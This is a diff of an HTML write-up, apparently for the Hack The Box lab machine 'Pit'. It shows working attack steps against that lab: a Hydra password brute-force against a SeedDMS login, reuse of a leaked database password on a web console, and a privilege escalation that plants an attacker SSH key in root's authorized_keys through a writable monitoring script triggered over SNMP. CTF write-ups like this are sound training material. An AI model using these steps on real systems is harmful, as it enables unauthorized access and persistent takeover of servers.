@@ -18,7 +18,8 @@ layout: default
         <li><a href="#summary">Summary</a></li>
         <li><a href="#portscan">Port Scanning</a></li>
         <li><a href="#infogather">Information Gathering</a></li>
-        <li><a href="#???">Shell - ???</a></li>
+        <li><a href="#nginx">Shell - nginx</a></h2>
+        <li><a href="#michelle">Shell - michelle</a></li>
         <li><a href="#root">Shell - root</a></li>
     </ul>
     
@@ -73,6 +74,9 @@ layout: default
 
     <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ hydra dms-pit.htb http-post-form -l michelle -P /usr/share/wordlists/rockyou.txt &quot;/seeddms51x/seeddms/op/op.Login.php:login=^USER^&amp;pwd=^PASS^&amp;lang=:incorrect&quot;         &#13;&#10;Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).&#13;&#10;&#13;&#10;Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-19 11:59:42&#13;&#10;[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task&#13;&#10;[DATA] attacking http-post-form://dms-pit.htb:80/seeddms51x/seeddms/op/op.Login.php:login=^USER^&amp;pwd=^PASS^&amp;lang=:incorrect&#13;&#10;[80][http-post-form] host: dms-pit.htb   login: michelle   password: michelle&#13;&#10;1 of 1 target successfully completed, 1 valid password found&#13;&#10;Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-19 11:59:46&#13;&#10;</pre>
 
+    <br>
+    <h2><a id="nginx">Shell - nginx</a></h2>
+
     <li>I quickly find the password is michelle.  This would have been easy to guess.  With authentication to seeddms I take a closer look at the RCE exploit.  I download php/webapps/47022.txt from searchsploit.  It basically says I can upload a php reverse shell and access it in the location /data/1048576/"document_id"/1.php.  After logging in to http://dms-pit.htb/seeddms51x/seeddms with the credentials michelle:michelle I start poking around to see where I can upload the document.  I find in the directory Docs/Users/Michelle/ I get access to the menu that contains the option to "Add document".</li>
 
     <img src="../images/pit/seeddms.png">
@@ -114,16 +118,88 @@ layout: default
 
     <pre>    &lt;database dbDriver=&quot;mysql&quot; dbHostname=&quot;localhost&quot; dbDatabase=&quot;seeddms&quot; dbUser=&quot;seeddms&quot; dbPass=&quot;ied^ieY6xoquu&quot; doNotCheckVersion=&quot;false&quot;&gt;&#13;&#10;    </pre>
 
-    <li>I connect to the sql server but do not find anything interesting.  I even tried cracking the hashes found in the users table for seeddms but am unable to crack any of them except for michelles.  This hash is for the password of michelle which we already know.</li>
+    <br>
+    <h2><a id="michelle">Shell - michelle</a></h2>
 
+    <li>I connect to the sql server but do not find anything interesting.  I found the user table for seeddms that contained the user's hashes passwords but I was only able to crack michelle's.  This hash is for the password of "michelle" which we already know.  I am unable to find anything else interesting on the box at this time so I revisit the website on port 9090.  I am able to login to the web service using michelle as the username and ied^ieY6xoquu as the password.</li>
 
+    <img src="../images/pit/cockpit_login.png">
+
+    <br>
+    <br>
+
+    <li>Once logged in I select "Accounts" and then click on michelle.</li>
+
+    <img src="../images/pit/cockpit_ssh.png">
+
+    <br>
+    <br>
+
+    <li>Clicking on the + sign next to "Authorized Public SSH Keys" brings up a prompt that allows me to add a public ssh key.  So I generate my own SSH key pair in order to add the public key to this prompt.</li>
+
+    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ pwd                         &#13;&#10;/home/kali/Documents/htb2/Pit&#13;&#10;                                                                                                                     &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ ssh-keygen                                  &#13;&#10;Generating public/private rsa key pair.&#13;&#10;Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/Documents/htb2/Pit/michelle_rsa&#13;&#10;Enter passphrase (empty for no passphrase): &#13;&#10;Enter same passphrase again: &#13;&#10;Your identification has been saved in /home/kali/Documents/htb2/Pit/michelle_rsa&#13;&#10;Your public key has been saved in /home/kali/Documents/htb2/Pit/michelle_rsa.pub&#13;&#10;The key fingerprint is:&#13;&#10;SHA256:SOMsbyqS8mm1hGrjmybI9TReUPxIu+70UmIhWqdrgJE kali@kali&#13;&#10;The key&apos;s randomart image is:&#13;&#10;+---[RSA 3072]----+&#13;&#10;|      .          |&#13;&#10;|       +         |&#13;&#10;|  .   = +        |&#13;&#10;| E   B B .       |&#13;&#10;|  o.+ O S        |&#13;&#10;| ..+o* = .       |&#13;&#10;|oo.o=.O.o        |&#13;&#10;|B=+..B.o.        |&#13;&#10;|*B=.o ....       |&#13;&#10;+----[SHA256]-----+&#13;&#10;                                                                                                                     &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ cat michelle_rsa.pub &#13;&#10;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC14xmfFrqmnypESRcXBJMYVJht9I+zCPczz52mSk7b5aOYOqP4fY8zfrhkJ8HEBjjz8XbilpB4L3StVuEOV4DpgAzyocFUzXzztrmPOHj61h68xxzGbDcMiZ32i9/V+lH9DngCsF8Whjkljn0UQH42Og4zRK2GorWnmNMVFqwtMsLjwwD2mxqkWApmqgjUdCD8a/3vs09AgSWIWghI1ZEaEDEJgYGL/VDfal47DKkVUtZaECJi4jXrXDVQrDs+ABLYuGcCNGHuRu71EKmAdZht9WG6Ik/wRLGsZ05KyHw7fTMFAMhni+ye8QQd6+3M2OrKi72lhNDxTJ5mtKDYhXWWoWiY+WB+aO1zbtrCkL+ZannXrUR9FjGjmDOMpqHajwe619gYAhcQrzTSkKT+A+gPSC/PSOC3ugNVc1R/ZTMhb5udVNwh+A093pSxQfBLY/EPic8QDDsRfwc/mpgfbgEKP1AZipuUmFImIdC3VVucTWTLgQfuZjMkgPXc4Nn4kVc= kali@kali&#13;&#10;</pre>
+
+    <li>With the public key generate I copy the public key except for the kali@kali part and add it to the website.</li>
+
+    <img src="../images/pit/cockpit_add_ssh.png">
+
+    <br>
+    <br>
+
+    <li>After clicking "Add" I login as michelle using the SSH key.</li>
+
+    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ ssh michelle@10.129.95.189 -i michelle_rsa                                                                 255 &Cross;&#13;&#10;Web console: https://pit.htb:9090/&#13;&#10;&#13;&#10;Last login: Fri Nov 19 14:15:39 2021&#13;&#10;[michelle@pit ~]$ id&#13;&#10;uid=1000(michelle) gid=1000(michelle) groups=1000(michelle) context=user_u:user_r:user_t:s0&#13;&#10;[michelle@pit ~]$ &#13;&#10;</pre>
     
     <br>
-    <h2><a id="???">Shell - ???</a></h2>
-    
-    
+    <h2><a id="root">Shell - root</a></h2>
+
+    <li>As michelle I look the /usr/bin/monitor file that I saw in the output from snmpwalk.</li>
+
+    <pre>[michelle@pit ~]$ ls -la /usr/bin/monitor &#13;&#10;-rwxr--r--. 1 root root 88 Apr 18  2020 /usr/bin/monitor&#13;&#10;</pre>
+
+    <li>I have read access to this file so I use cat against it see what I can see.</li>
+
+    <pre>[michelle@pit ~]$ cat /usr/bin/monitor&#13;&#10;#!/bin/bash&#13;&#10;&#13;&#10;for script in /usr/local/monitoring/check*sh&#13;&#10;do&#13;&#10;    /bin/bash $script&#13;&#10;done</pre>
+
+    <li>It appears the file is executing all scripts in the /usr/local/monitoring directory with the name check*sh.  The * is working as a wildcard, so any script with a name fitting that pattern will be executed.  I am assuming this file is being ran by root based on the fact that it is owned by root and only executable by root.  So I attempt to navigate to /usr/local/monitoring in order to create the script.  When I change directories to the /usr/local/monitoring I am unable to list the contents of the directory.</li>
+
+    <pre>[michelle@pit ~]$ cd /usr/local/monitoring/&#13;&#10;[michelle@pit monitoring]$ ls -la&#13;&#10;ls: cannot open directory &apos;.&apos;: Permission denied&#13;&#10;</pre>
+
+    <li>Since I am unable to list the contents of the directory, which is strange, I back down one level to the /usr/local directory and use <code>ls -lad</code> against the monitoring folder to see what the permissions look like since it is acting strange.</li>
+
+    <pre>[michelle@pit local]$ pwd&#13;&#10;/usr/local&#13;&#10;[michelle@pit local]$ ls -lad monitoring/&#13;&#10;drwxrwx---+ 2 root root 138 Nov 19 14:35 monitoring/&#13;&#10;</pre>
+
+    <li>The basic permissions on this file show that I have no permissions michelle.  However, there is a + sign on the right of the permissions which means there are extended permissions on this folder which is a feature of selinux.  I use the command <code>getfacls</code> against it to view the extended permissions.</li>
+
+    <pre>[michelle@pit local]$ getfacl monitoring/&#13;&#10;# file: monitoring/&#13;&#10;# owner: root&#13;&#10;# group: root&#13;&#10;user::rwx&#13;&#10;user:michelle:-wx&#13;&#10;group::rwx&#13;&#10;mask::rwx&#13;&#10;other::---</pre>
+
+    <li>michelle has extended permissions which allow us to write and execute to the monitoring directory but we cannot read from the directory.  This explains the strange behavior.  At this point I use echo to create a script in the monitoring directory to add a ssh key to the root user.  I name it "check1sh" because that matches the pattern of check*sh, which the /usr/bin/monitor file is searching for.  First I create the root ssh key.</li>
+
+    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ ssh-keygen                                 &#13;&#10;Generating public/private rsa key pair.&#13;&#10;Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/Documents/htb2/Pit/root_rsa&#13;&#10;Enter passphrase (empty for no passphrase): &#13;&#10;Enter same passphrase again: &#13;&#10;Your identification has been saved in /home/kali/Documents/htb2/Pit/root_rsa&#13;&#10;Your public key has been saved in /home/kali/Documents/htb2/Pit/root_rsa.pub&#13;&#10;The key fingerprint is:&#13;&#10;SHA256:Q9HmHp/I0FD7VwS1pg9ROR8U2d24f/59W1bEAQFw5JQ kali@kali&#13;&#10;The key&apos;s randomart image is:&#13;&#10;+---[RSA 3072]----+&#13;&#10;|        .++=oo=OX|&#13;&#10;|        ..*E  oB*|&#13;&#10;|        .=.. . +B|&#13;&#10;|       .. +.  =o.|&#13;&#10;|        S+ +.+...|&#13;&#10;|         .+ o.o +|&#13;&#10;|               o+|&#13;&#10;|               .=|&#13;&#10;|               .*|&#13;&#10;+----[SHA256]-----+&#13;&#10;</pre>
+
+    <li>Now I copy the contents of the root public key I generated.</li>
+
+    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ cat root_rsa.pub                                                                                           130 &Cross;&#13;&#10;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQXF2b+M7wNJareW2ak2gRJBhsJoylV6pEpBUVFYw/lp+UulaPalJm4iF6AN5l8294JDz5AUx2kPuiPffItasi0RXDbx8XaJwWIzSyTHC9iNNiEzVbaRD2fOGSPNBA2P4R95zlyGNsjzyBDSBXtpM1uUrcczDuonYwXXyY3upYkJ0bCg/3+IJCcBiNIR2szp//6+8T4Qh2jS+eK4x6s7xwOzA2i5H5xByIDXpdVXFPub+U1kIUHgaYLTbYlu+5iPTDUjMwGQa0EnWl0Y3iLMXnDSWK1MVDp86nQy384H7LBjHDbMbz6ob6iERH23ytumIW/l9ju5X1PONeixQ/+r468msqR2FZfbmR0nCPgsnIwNuVtT2qovWSDc7YaX4Y/xRT14gh3AyjbKa5jH8wsdgLLIazeL3qH5mPsBLyjQlEiU0qeqn2WUGz0hWZ0j3mC8ez3uzYOnzRpykUWHrTQjO23GawGH6s/P3o7KEdLWaw6AbFcYYQaZoiwH2ba8vkowE= kali@kali&#13;&#10;</pre>
+
+    <li>Then I use the echo command to create the script that will add the public key to the root users authorized_keys file.</li>
+
+    <pre>echo &quot;echo &apos;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQXF2b+M7wNJareW2ak2gRJBhsJoylV6pEpBUVFYw/lp+UulaPalJm4iF6AN5l8294JDz5AUx2kPuiPffItasi0RXDbx8XaJwWIzSyTHC9iNNiEzVbaRD2fOGSPNBA2P4R95zlyGNsjzyBDSBXtpM1uUrcczDuonYwXXyY3upYkJ0bCg/3+IJCcBiNIR2szp//6+8T4Qh2jS+eK4x6s7xwOzA2i5H5xByIDXpdVXFPub+U1kIUHgaYLTbYlu+5iPTDUjMwGQa0EnWl0Y3iLMXnDSWK1MVDp86nQy384H7LBjHDbMbz6ob6iERH23ytumIW/l9ju5X1PONeixQ/+r468msqR2FZfbmR0nCPgsnIwNuVtT2qovWSDc7YaX4Y/xRT14gh3AyjbKa5jH8wsdgLLIazeL3qH5mPsBLyjQlEiU0qeqn2WUGz0hWZ0j3mC8ez3uzYOnzRpykUWHrTQjO23GawGH6s/P3o7KEdLWaw6AbFcYYQaZoiwH2ba8vkowE=&apos; &gt; /root/.ssh/authorized_keys&quot; &gt; /usr/local/monitoring/checkxsh</pre>
+
+    <li>With the script in place I now execute the /usr/bin/monitor executable using snmp.  I can either run snmpwalk just as I did before and fully enumerate everything again.  Or I can specify the OID for /usr/bin/monitor and trigger the monitor executable immediately.  The box is running a script that clears everything in the /usr/local/monitoring directory somewhat frequently so you will want to make sure the script you create in that folder is not cleared by the system before you get a chance to execute it.</li>
+
     <br>
-    <h2><a id="root">Shell - Root</a></h2>
+
+    <li>I find the OID for /usr/bin/monitor</li>
+
+    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ cat snmpwalk.out| grep monitor                                                                                                                                                                                                      130 &Cross;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: &quot;/usr/bin/monitor&quot;&#13;&#10;</pre>
+
+    <li>I execute it using snmpwalk</li>
+
+    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ snmpwalk -v 1 -c public 10.129.95.189 iso.3.6.1.4.1.8072.1.3.2.3.1.2.10.109.111.110.105.116.111.114.105.110.103                                                                                                                       1 &Cross;&#13;&#10;iso.3.6.1.4.1.8072.1.3.2.3.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: &quot;Memory usage&#13;&#10;              total        used        free      shared  buff/cache   available&#13;&#10;Mem:          3.8Gi       394Mi       3.1Gi       8.0Mi       345Mi       3.2Gi&#13;&#10;Swap:         1.9Gi          0B       1.9Gi&#13;&#10;Database status&#13;&#10;OK - Connection to database successful.&#13;&#10;System release info&#13;&#10;CentOS Linux release 8.3.2011&#13;&#10;SELinux Settings&#13;&#10;user&#13;&#10;&#13;&#10;                Labeling   MLS/       MLS/                          &#13;&#10;SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles&#13;&#10;&#13;&#10;guest_u         user       s0         s0                             guest_r&#13;&#10;root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r&#13;&#10;staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r&#13;&#10;sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r&#13;&#10;system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r&#13;&#10;unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r&#13;&#10;user_u          user       s0         s0                             user_r&#13;&#10;xguest_u        user       s0         s0                             xguest_r&#13;&#10;login&#13;&#10;&#13;&#10;Login Name           SELinux User         MLS/MCS Range        Service&#13;&#10;&#13;&#10;__default__          unconfined_u         s0-s0:c0.c1023       *&#13;&#10;michelle             user_u               s0                   *&#13;&#10;root                 unconfined_u         s0-s0:c0.c1023       *&#13;&#10;System uptime&#13;&#10; 15:01:38 up  5:17,  2 users,  load average: 0.00, 0.00, 0.00&quot;&#13;&#10;</pre>
+
+    <li>Finally, I am able to connect to the box as root using the ssh key.</li>
+
+    <pre>&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/htb2/Pit]&#13;&#10;&boxur;&HorizontalLine;$ ssh root@10.129.95.189 -i root_rsa                             &#13;&#10;Web console: https://pit.htb:9090/&#13;&#10;&#13;&#10;Last login: Mon Jul 26 09:15:10 2021&#13;&#10;[root@pit ~]# &#13;&#10;</pre>
     
 </body>
 </html>
